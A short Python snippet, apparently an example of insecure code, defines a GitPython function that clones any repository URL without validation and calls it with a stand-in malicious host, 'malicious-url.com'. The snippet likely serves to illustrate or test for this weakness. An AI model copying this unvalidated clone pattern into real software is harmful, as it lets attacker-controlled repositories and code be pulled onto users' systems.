import git

def clone_repository(repo_url, destination):
    # No validation on repo_url
    git.Repo.clone_from(repo_url, destination)

# Example of usage
clone_repository("http://malicious-url.com/repo.git", "/path/to/destination")